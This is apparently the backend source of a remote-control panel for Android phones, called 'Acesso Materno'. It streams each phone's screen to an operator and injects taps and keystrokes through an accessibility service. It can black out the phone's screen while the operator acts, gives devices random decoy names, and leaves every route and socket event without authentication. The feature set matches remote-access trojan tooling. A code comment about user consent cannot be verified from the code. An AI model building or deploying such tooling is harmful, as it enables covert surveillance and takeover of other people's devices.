import base64
import ipaddress
import subprocess
import os
import sys
import time
import random
import socketio
from fastapi import FastAPI, BackgroundTasks, Request, Response
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# Libera o acesso de clientes fora da rede local (app Android via túnel, etc.).
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
    allow_credentials=False,
)

# Estado global da compilação do APK (consultado pela interface via /status-build)
estado_build = {"status": "ocioso", "mensagem": "", "apk": None}

# Estado da janela do scrcpy: "acoplado" (embutido no painel) ou "destacado" (flutuante).
estado_scrcpy = {"modo": "acoplado", "titulo": None}

# Domínio de PRODUÇÃO fixo (Cloudflare Tunnel). Carimbado nos builds do APK.
PANEL_URL = "https://painel.megabrasiliautilidades.store"

# ---------------------------------------------------------------------------
# Console de debug: buffer em memória com os logs, servido ao painel (/debug-logs).
# ---------------------------------------------------------------------------
import datetime
import logging
from collections import deque

logs_debug = deque(maxlen=1000)


def registrar_log(msg):
    """Adiciona uma linha ao console de debug do painel e também imprime no stdout."""
    linha = f"{datetime.datetime.now():%H:%M:%S} {msg}"
    logs_debug.append(linha)
    try:
        print(linha, flush=True)
    except Exception:
        pass


class _BufferLogHandler(logging.Handler):
    """Captura logs do uvicorn/socketio/engineio para o mesmo console de debug."""
    def emit(self, record):
        try:
            logs_debug.append(
                f"{datetime.datetime.now():%H:%M:%S} [{record.name}] {record.getMessage()}"
            )
        except Exception:
            pass


_handler_buffer = _BufferLogHandler()
for _nome_logger in ("uvicorn", "uvicorn.error", "uvicorn.access", "socketio", "engineio"):
    logging.getLogger(_nome_logger).addHandler(_handler_buffer)

registrar_log("[INICIO] Backend do Acesso Materno iniciando...")

# ---------------------------------------------------------------------------
# Servidor Socket.IO (mesmo protocolo do socket.io-client do app Android).
# Recebe os frames de tela (MediaProjection) e guarda o último em memória,
# para a rota /visualizar-imagem servir ao painel.
# ---------------------------------------------------------------------------
sio = socketio.AsyncServer(async_mode="asgi", cors_allowed_origins="*")

# Frames de tela POR DISPOSITIVO: nome -> {"jpeg": bytes, "n": int, "ts": float}
frames_tela = {}

filhos = set()                       # sids dos aparelhos conectados
sid_nome = {}                        # sid  -> nome do dispositivo
nome_sid = {}                        # nome -> sid (socket atual do dispositivo)
ultimo_dispositivo = {"nome": None}  # último que enviou frame (fallback de exibição)


@sio.event
async def connect(sid, environ):
    registrar_log(f"[SOCKET.IO] Cliente conectado: {sid}")


@sio.event
async def disconnect(sid):
    filhos.discard(sid)
    nome = sid_nome.pop(sid, None)
    if nome and nome_sid.get(nome) == sid:
        nome_sid.pop(nome, None)
    registrar_log(f"[SOCKET.IO] Cliente desconectado: {sid}" + (f" ({nome})" if nome else ""))


@sio.event
async def identificar(sid, tipo):
    # 'tipo' = NOME do dispositivo, ou "painel" (navegador que recebe os frames).
    nome = str(tipo) if tipo else "dispositivo"
    if nome.lower() == "painel":
        await sio.enter_room(sid, "painel")
        registrar_log(f"[SOCKET.IO] Painel conectado (sid {sid[:6]})")
        return
    filhos.add(sid)
    sid_nome[sid] = nome
    nome_sid[nome] = sid
    registrar_log(f"[SOCKET.IO] Aparelho registrado: '{nome}' (sid {sid[:6]})")


def _sids_alvo(dispositivo):
    """Resolve os sids de destino: o dispositivo indicado; senão todos (compat)."""
    if dispositivo and dispositivo in nome_sid:
        return [nome_sid[dispositivo]]
    return list(filhos)


@sio.on("clique_painel")
async def clique_painel(sid, data):
    """Clique/gesto do painel -> 'receber_movimento' no aparelho SELECIONADO."""
    try:
        x = float(data.get("x", 0.0))
        y = float(data.get("y", 0.0))
    except Exception as e:
        registrar_log(f"[CLIQUE] payload inválido: {e}")
        return

    dispositivo = data.get("dispositivo")
    alvos = _sids_alvo(dispositivo)
    acao = data.get("acao")
    if acao in ("START", "MOVE", "END"):
        for fsid in alvos:
            await sio.emit("receber_movimento", {"acao": acao, "x": x, "y": y}, to=fsid)
        if acao != "MOVE":
            registrar_log(f"[GESTO] {acao} -> {dispositivo or 'todos'} ({len(alvos)})")
    else:
        for fsid in alvos:
            await sio.emit("receber_movimento", {"acao": "START", "x": x, "y": y}, to=fsid)
            await sio.emit("receber_movimento", {"acao": "END", "x": x, "y": y}, to=fsid)
        registrar_log(f"[CLIQUE] ({x:.3f}, {y:.3f}) -> {dispositivo or 'todos'} ({len(alvos)})")


@sio.on("tecla_painel")
async def tecla_painel(sid, data):
    """Teclado do painel -> 'receber_tecla' no aparelho SELECIONADO."""
    tipo = data.get("tipo", "")
    valor = data.get("valor", "")
    dispositivo = data.get("dispositivo")
    alvos = _sids_alvo(dispositivo)
    for fsid in alvos:
        await sio.emit("receber_tecla", {"tipo": tipo, "valor": valor}, to=fsid)
    rotulo = valor if tipo == "tecla" else "caractere"
    registrar_log(f"[TECLA] {tipo}:{rotulo} -> {dispositivo or 'todos'} ({len(alvos)})")


@sio.on("tela_privacidade_painel")
async def tela_privacidade_painel(sid, data):
    """Painel pede a tela de privacidade -> 'tela_privacidade' no aparelho.

    O aparelho SEMPRE pede consentimento antes de escurecer, e o usuário
    pode sair a qualquer momento (Volume -). acao: 'mostrar' | 'ocultar'.
    """
    acao = (data or {}).get("acao", "mostrar")
    dispositivo = (data or {}).get("dispositivo")
    alvos = _sids_alvo(dispositivo)
    for fsid in alvos:
        await sio.emit("tela_privacidade", {"acao": acao}, to=fsid)
    registrar_log(f"[PRIVACIDADE] {acao} -> {dispositivo or 'todos'} ({len(alvos)})")


@sio.on("tela_privacidade_estado")
async def tela_privacidade_estado(sid, estado):
    """Aparelho avisa 'ativa'/'inativa' -> repassa ao painel (sincroniza o botão)."""
    nome = sid_nome.get(sid, "?")
    await sio.emit("tela_privacidade_estado", estado, room="painel")
    registrar_log(f"[PRIVACIDADE] estado '{estado}' de {nome}")


@sio.on("log_dispositivo")
async def log_dispositivo(sid, msg):
    """Logs enviados pelo próprio app para o console do painel."""
    nome = sid_nome.get(sid)
    registrar_log(f"[APP {nome or sid[:6]}] {msg}")


@sio.on("enviar_tela")
async def enviar_tela(sid, data):
    """Frame Base64 (JPEG) do app -> guardado por dispositivo e empurrado ao painel."""
    try:
        if isinstance(data, (bytes, bytearray)):
            jpeg = bytes(data)
            b64 = base64.b64encode(jpeg).decode("ascii")
        else:
            b64 = data
            jpeg = base64.b64decode(data)
    except Exception as e:
        registrar_log(f"[TELA] frame inválido de {sid}: {e}")
        return

    nome = sid_nome.get(sid, "global")
    rec = frames_tela.setdefault(nome, {"jpeg": None, "n": 0, "ts": 0.0})
    rec["jpeg"] = jpeg
    rec["n"] += 1
    rec["ts"] = time.time()
    ultimo_dispositivo["nome"] = nome

    # Push em tempo real para o(s) painel(is) aberto(s) — sem polling, sem travamento.
    await sio.emit("frame", {"dispositivo": nome, "jpeg": b64}, room="painel")

    if rec["n"] == 1 or rec["n"] % 30 == 0:
        registrar_log(f"[TELA] frame #{rec['n']} de '{nome}' ({len(jpeg) // 1024} KB)")


def _encontrar_raiz_projeto():
    """Localiza a pasta do projeto Android procurando o gradlew.bat.

    Funciona tanto rodando o server.py direto (cwd = raiz) quanto a partir do
    executável empacotado (sobe a partir da pasta do .exe até achar o gradlew).
    """
    bases = [os.getcwd(), os.path.dirname(os.path.abspath(sys.argv[0]))]
    if getattr(sys, "frozen", False):
        bases.append(os.path.dirname(sys.executable))
    else:
        bases.append(os.path.dirname(os.path.abspath(__file__)))

    vistos = set()
    for base in bases:
        atual = base
        for _ in range(6):
            if atual and atual not in vistos:
                vistos.add(atual)
                if os.path.exists(os.path.join(atual, "gradlew.bat")):
                    return atual
            pai = os.path.dirname(atual)
            if pai == atual:
                break
            atual = pai
    return None


def _encontrar_java_home():
    """Retorna um JAVA_HOME utilizável. Usa o do ambiente, senão o JDK embutido
    no Android Studio (JBR), para o Gradle funcionar mesmo sem JAVA_HOME global."""
    jh = os.environ.get("JAVA_HOME")
    if jh and os.path.exists(os.path.join(jh, "bin", "java.exe")):
        return jh

    import shutil
    if shutil.which("java"):
        return None  # java já está no PATH; não precisa forçar JAVA_HOME

    candidatos = [
        r"C:\Program Files\Android\Android Studio\jbr",
        r"C:\Program Files\Android\Android Studio1\jbr",
        os.path.expandvars(r"%LOCALAPPDATA%\Programs\Android Studio\jbr"),
    ]
    for c in candidatos:
        if os.path.exists(os.path.join(c, "bin", "java.exe")):
            return c
    return None


def compilar_apk_em_segundo_plano():
    """Executa 'gradlew.bat assembleRelease' e abre o Explorer no APK gerado."""
    estado_build.update(
        status="compilando",
        mensagem="Compilando código Android... Aguarde (pode levar alguns minutos).",
        apk=None,
    )

    raiz = _encontrar_raiz_projeto()
    if not raiz:
        estado_build.update(
            status="erro",
            mensagem="gradlew.bat não encontrado. Rode a partir da pasta do projeto Android.",
        )
        return

    gradlew = os.path.join(raiz, "gradlew.bat")
    ambiente = os.environ.copy()
    java_home = _encontrar_java_home()
    if java_home:
        ambiente["JAVA_HOME"] = java_home
        print(f"[BUILD] Usando JAVA_HOME: {java_home}")

    # Domínio de produção fixo (carimbado também no build.gradle.kts).
    comando = [gradlew, "assembleRelease", f"-PpanelUrl={PANEL_URL}"]
    estado_build["mensagem"] = f"Compilando com painel: {PANEL_URL} ..."
    print(f"[BUILD] PANEL_URL fixo: {PANEL_URL}")

    print(f"[BUILD] Iniciando Gradle em: {raiz}")
    try:
        proc = subprocess.run(
            comando,
            cwd=raiz,
            shell=True,
            env=ambiente,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
    except Exception as e:
        estado_build.update(status="erro", mensagem=f"Falha ao iniciar o Gradle: {e}")
        return

    if proc.returncode != 0:
        print("[BUILD] Gradle falhou:\n", (proc.stdout or "")[-2000:])
        estado_build.update(
            status="erro",
            mensagem=f"O Gradle falhou (código {proc.returncode}). Verifique o JDK/Android SDK.",
        )
        return

    pasta_apk = os.path.join(raiz, "app", "build", "outputs", "apk", "release")
    apk = None
    if os.path.isdir(pasta_apk):
        # Prefere o APK assinado (app-release.apk); senão, qualquer .apk da pasta.
        candidatos = [n for n in os.listdir(pasta_apk) if n.lower().endswith(".apk")]
        candidatos.sort(key=lambda n: ("unsigned" in n.lower(), n))
        if candidatos:
            apk = os.path.join(pasta_apk, candidatos[0])

    if not apk:
        estado_build.update(
            status="erro",
            mensagem="Build concluído, mas nenhum arquivo .apk foi encontrado na pasta de saída.",
        )
        return

    print(f"[BUILD] APK gerado: {apk}")
    # Abre o Windows Explorer já com o arquivo .apk em destaque (selecionado).
    try:
        subprocess.Popen(f'explorer /select,"{apk}"')
    except Exception:
        try:
            os.startfile(pasta_apk)
        except Exception:
            pass

    estado_build.update(
        status="concluido",
        mensagem=f"Concluído! Pasta aberta com o APK em destaque. (painel: {PANEL_URL})",
        apk=apk,
    )


@app.get("/compilar-app")
def compilar_app(background_tasks: BackgroundTasks):
    """Dispara a compilação do APK em segundo plano, sem travar a interface."""
    if estado_build.get("status") == "compilando":
        return {"status": "compilando", "mensagem": "Já existe uma compilação em andamento."}
    estado_build.update(status="compilando", mensagem="Iniciando compilação...", apk=None)
    background_tasks.add_task(compilar_apk_em_segundo_plano)
    return {"status": "iniciado", "mensagem": "Compilação iniciada em segundo plano."}


@app.get("/status-build")
def status_build():
    """Retorna o andamento da compilação para a interface acompanhar."""
    return estado_build


@app.get("/janela-scrcpy")
def janela_scrcpy(modo: str):
    """Alterna entre janela do scrcpy acoplada ao painel ou flutuante (destacada)."""
    if modo in ("acoplar", "acoplado"):
        estado_scrcpy["modo"] = "acoplado"
    elif modo in ("destacar", "destacado", "flutuante"):
        estado_scrcpy["modo"] = "destacado"
    return {"status": "ok", "modo": estado_scrcpy["modo"]}


@app.get("/estado-janela-scrcpy")
def estado_janela_scrcpy():
    """A GUI (PyQt6) consulta isto para acoplar/destacar a janela do scrcpy."""
    return estado_scrcpy

# Caminhos mapeados com base nas ferramentas no seu C:
PASTA_SCRCPY = r"C:\tools\scrcpy"
CAMINHO_SCRCPY = os.path.join(PASTA_SCRCPY, "scrcpy.exe")
CAMINHO_ADB = os.path.join(PASTA_SCRCPY, "adb.exe")

# Estruturas para gerenciar múltiplos aparelhos ao mesmo tempo
dispositivos_ativos = {}
dispositivo_selecionado = None

# Prefixos para os celulares ativos na lista
NOMES_ALEATORIOS = ["Galaxy-Alpha", "Moto-Vanguard", "Nexus-Prime", "Xperia-Shield", "Pixel-Falcon", "Zeta-Phone"]

def _ip_local(ip: str) -> bool:
    """True se o IP é loopback/emulador/rede privada (onde o scrcpy/ADB funciona)."""
    if ip in ("127.0.0.1", "localhost", "10.0.2.2"):
        return True
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


def conectar_celular_remoto(ip_cliente: str, nome_celular: str, porta_remota: int = 5555):
    """Pareia o ADB e abre o scrcpy garantindo CONTROLE TOTAL e suporte a múltiplos aparelhos"""
    if not os.path.exists(CAMINHO_SCRCPY):
        registrar_log(f"[ERRO CRÍTICO] scrcpy não encontrado em: {CAMINHO_SCRCPY}")
        return

    registrar_log(f"[SCRCPY] === Iniciando conexão: {nome_celular} (IP reportado: {ip_cliente}) ===")

    # IMPORTANTE: Removido o 'adb disconnect' global para permitir múltiplos celulares simultâneos
    serial_dispositivo = ""

    # 1. Identifica e configura o canal de cada dispositivo de forma independente
    if ip_cliente in ["127.0.0.1", "localhost", "10.0.2.2"]:
        registrar_log("[ADB] Dispositivo local/emulador — listando dispositivos adb:")
        resultado = subprocess.run([CAMINHO_ADB, "devices"], capture_output=True, text=True, shell=True)
        registrar_log(f"[ADB] devices -> {resultado.stdout.strip() or '(vazio)'}")
        if (resultado.stderr or "").strip():
            registrar_log(f"[ADB][stderr] {resultado.stderr.strip()}")
        # Em conexões locais, o scrcpy usa o único dispositivo disponível.
    else:
        # Conexão vinda de rede externa/túnel
        endereco_alvo = f"{ip_cliente}:{porta_remota}"
        serial_dispositivo = endereco_alvo
        registrar_log(f"[ADB] Tentando parear com dispositivo remoto: {endereco_alvo}")

        r = subprocess.run(
            [CAMINHO_ADB, "connect", endereco_alvo],
            capture_output=True, text=True, shell=True,
        )
        registrar_log(f"[ADB] connect -> {(r.stdout or '').strip() or '(sem stdout)'}")
        if (r.stderr or "").strip():
            registrar_log(f"[ADB][stderr] {r.stderr.strip()}")

        # Verifica se o pareamento REALMENTE funcionou antes de tentar abrir o scrcpy.
        estado = subprocess.run(
            [CAMINHO_ADB, "-s", endereco_alvo, "get-state"],
            capture_output=True, text=True, shell=True,
        )
        st = (estado.stdout or "").strip()
        registrar_log(f"[ADB] get-state({endereco_alvo}) -> {st or (estado.stderr or '').strip() or '(sem resposta)'}")

        if st != "device":
            registrar_log(
                f"[ERRO] ADB não conseguiu parear com {endereco_alvo}; o scrcpy NÃO será aberto. "
                f"Causa típica: {ip_cliente} é um IP público atrás de NAT (4G/Wi-Fi), inacessível por "
                f"'adb connect'. O scrcpy exige o aparelho em LAN/USB ou um túnel ADB dedicado até a "
                f"porta {porta_remota}. (A tela remota continua via Socket.IO; os cliques via "
                f"'clique_painel' -> AccessibilityService.)"
            )
            estado_scrcpy["titulo"] = None
            return

        # Pareado com sucesso: cria o reverse para o canal de controle (cliques/teclado).
        rev = subprocess.run(
            [CAMINHO_ADB, "-s", endereco_alvo, "reverse", f"tcp:{porta_remota}", f"tcp:{porta_remota}"],
            capture_output=True, text=True, shell=True,
        )
        if (rev.stderr or "").strip():
            registrar_log(f"[ADB][reverse][stderr] {rev.stderr.strip()}")

    # 2. Configura os argumentos de inicialização do scrcpy
    argumentos_scrcpy = [
        CAMINHO_SCRCPY,
        "--max-size", "1024",
        "--video-bitrate", "1.5M",
        "--always-on-top",
        "--window-title", f"Controle Assistivo - {nome_celular}",
        "--tunnel-host", "127.0.0.1",
        "--prefer-text",
    ]
    if serial_dispositivo:
        argumentos_scrcpy.extend(["--serial", serial_dispositivo])

    # Registra o título da janela para a GUI conseguir localizá-la e acoplá-la.
    estado_scrcpy["titulo"] = f"Controle Assistivo - {nome_celular}"

    # 3. Executa a janela do scrcpy
    registrar_log(f"[SCRCPY] Comando: {' '.join(argumentos_scrcpy)}")
    try:
        subprocess.Popen(argumentos_scrcpy, creationflags=subprocess.CREATE_NEW_CONSOLE)
        registrar_log(f"[SUCESSO] Janela de controle para {nome_celular} iniciada.")
    except Exception as e:
        registrar_log(f"[ERRO AO ABRIR SCRCPY] Falha operacional: {str(e)}")

_PLACEHOLDER_SVG = (
    b'<svg xmlns="http://www.w3.org/2000/svg" width="340" height="680">'
    b'<rect width="100%" height="100%" fill="#1f2937"/>'
    b'<text x="50%" y="48%" fill="#9ca3af" font-family="sans-serif" font-size="16" '
    b'text-anchor="middle">Aguardando v\xc3\xaddeo</text>'
    b'<text x="50%" y="54%" fill="#6b7280" font-family="sans-serif" font-size="13" '
    b'text-anchor="middle">do dispositivo...</text></svg>'
)


@app.get("/visualizar-imagem")
def obtener_imagem(dispositivo: str = None):
    # Serve o frame do dispositivo pedido (ou do último ativo). Sem frame -> "aguardando".
    if dispositivo:
        rec = frames_tela.get(dispositivo)
    else:
        rec = frames_tela.get(ultimo_dispositivo["nome"]) if ultimo_dispositivo["nome"] else None
    if rec and rec.get("jpeg"):
        return Response(content=rec["jpeg"], media_type="image/jpeg")
    return Response(content=_PLACEHOLDER_SVG, media_type="image/svg+xml")

@app.get("/conectar-filho")
def conectar_filho(request: Request, nome: str = None):
    """Rota chamada pelo aplicativo automaticamente ao ser iniciado"""
    global dispositivo_selecionado
    
    # Captura o IP de origem — prioriza X-Forwarded-For para suportar túneis/proxies
    # (ex.: ngrok), garantindo o registro correto de clientes fora da rede local.
    encaminhado = request.headers.get("x-forwarded-for")
    if encaminhado:
        ip_origem = encaminhado.split(",")[0].strip()
    else:
        ip_origem = request.client.host
    registrar_log(f"[SINAL] Requisição de ativação recebida do IP: {ip_origem}")
    
    # Atribui ou recupera o identificador do aparelho conectado
    if not nome:
        for nome_existente, ip_existente in dispositivos_ativos.items():
            if ip_existente == ip_origem:
                nome = nome_existente
                break
        if not nome:
            if ip_origem in ["127.0.0.1", "localhost"]:
                nome = "Emulador-MSI"
            else:
                nome = f"{random.choice(NOMES_ALEATORIOS)}-{random.randint(100, 999)}"
            
    # Registra no mapa global de dispositivos online
    dispositivos_ativos[nome] = ip_origem
    dispositivo_selecionado = nome  
    
    registrar_log(f"[IMEDIATO] Celular registrado: {nome} -> IP: {ip_origem}")
    return {"status": "registrado", "dispositivo": nome, "ip": ip_origem}

@app.get("/lista-dispositivos")
def lista_dispositivos():
    return {"dispositivos": dispositivos_ativos, "selecionado": dispositivo_selecionado}


@app.get("/status-tela")
def status_tela(dispositivo: str = None):
    """Diagnóstico do vídeo (por dispositivo): frames recebidos e se o fluxo está ativo."""
    nome = dispositivo or ultimo_dispositivo["nome"]
    rec = frames_tela.get(nome) if nome else None
    if not rec:
        return {"frames": 0, "ativo": False, "idade_ms": None}
    idade = (time.time() - rec["ts"]) if rec["ts"] else None
    ativo = bool(rec.get("jpeg") and idade is not None and idade < 5)
    return {
        "frames": rec["n"],
        "ativo": ativo,
        "idade_ms": int(idade * 1000) if idade is not None else None,
    }


@app.get("/debug-logs")
def debug_logs():
    """Console de debug: retorna as linhas de log acumuladas para o painel exibir."""
    return {"linhas": list(logs_debug), "total": len(logs_debug)}


@app.get("/debug-logs/limpar")
def limpar_debug_logs():
    logs_debug.clear()
    registrar_log("[DEBUG] Console limpo pelo usuário.")
    return {"status": "ok"}

@app.get("/selecionar-aparelho")
def selecionar_aparelho(nome: str, background_tasks: BackgroundTasks):
    """Rota chamada ao clicar no botão 'Conectar Este' dentro da lista lateral"""
    global dispositivo_selecionado
    if nome in dispositivos_ativos:
        dispositivo_selecionado = nome
        ip_alvo = dispositivos_ativos[nome]
        if _ip_local(ip_alvo):
            # LAN/USB/emulador: o scrcpy funciona, então abre a janela nativa.
            registrar_log(f"[CONECTAR ESTE] '{nome}' IP local ({ip_alvo}) → abrindo scrcpy (LAN/USB).")
            background_tasks.add_task(conectar_celular_remoto, ip_alvo, nome)
            return {"status": "conectando", "mensagem": f"Abrindo scrcpy para {nome} (rede local)."}
        # IP externo (WAN/4G): scrcpy é bloqueado por NAT. Usa o streaming Socket.IO.
        registrar_log(
            f"[CONECTAR ESTE] '{nome}' IP externo ({ip_alvo}) → usando streaming Socket.IO "
            f"(sem scrcpy). A tela aparece no painel; clique nela para controlar."
        )
        return {"status": "streaming", "mensagem": f"{nome} selecionado — vídeo via Socket.IO. Clique na tela para controlar."}
    registrar_log(f"[CONECTAR ESTE] ERRO: '{nome}' não está em dispositivos_ativos ({list(dispositivos_ativos)}).")
    return {"status": "erro", "mensagem": "Dispositivo não encontrado"}

@app.get("/desconectar-aparelho")
async def desconectar_aparelho(nome: str):
    """Remove o aparelho do painel E manda o app parar TUDO (tela/controle)."""
    global dispositivo_selecionado
    removido = dispositivos_ativos.pop(nome, None)
    if dispositivo_selecionado == nome:
        dispositivo_selecionado = None
    frames_tela.pop(nome, None)
    if ultimo_dispositivo["nome"] == nome:
        ultimo_dispositivo["nome"] = None

    # Sinaliza o aparelho para encerrar a captura de tela (desconexão total).
    sid = nome_sid.get(nome)
    if sid:
        await sio.emit("desligar", {}, to=sid)

    registrar_log(f"[DESCONECTAR] '{nome}' removido e sinal 'desligar' "
                  f"{'enviado' if sid else 'sem socket'} ({'ok' if removido else 'não estava na lista'}).")
    return {"status": "ok" if removido else "nao_encontrado", "dispositivo": nome}


@app.get("/disparar-botao-direto")
def disparar_botao_direto(background_tasks: BackgroundTasks):
    """Rota acionada ao clicar no botão mestre inferior (Abre sempre o último conectado)"""
    global dispositivo_selecionado
    
    if dispositivo_selecionado and dispositivo_selecionado in dispositivos_ativos:
        ip_alvo = dispositivos_ativos[dispositivo_selecionado]
        nome_alvo = dispositivo_selecionado
        print(f"[BOTÃO MESTRE] Disparando acesso remoto do último conectado: {nome_alvo}")
    else:
        ip_alvo = "127.0.0.1"
        nome_alvo = "Emulador-MSI"
        print("[BOTÃO MESTRE] Nenhum dispositivo na lista. Chamando emulador local por padrão.")
        
    background_tasks.add_task(conectar_celular_remoto, ip_alvo, nome_alvo)
    return {"status": "sucesso", "mensagem": f"Iniciando visualizador nativo para {nome_alvo}"}

@app.get("/", response_class=HTMLResponse)
def obtener_painel():
    if os.path.exists("index.html"):
        with open("index.html", "r", encoding="utf-8") as f:
            return f.read()
    return "<h3>Erro: O arquivo index.html não foi encontrado na pasta do projeto!</h3>"

# Aplicação ASGI combinada: Socket.IO + FastAPI (é esta que o uvicorn serve).
asgi_app = socketio.ASGIApp(sio, other_asgi_app=app)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(asgi_app, host="127.0.0.1", port=27103)
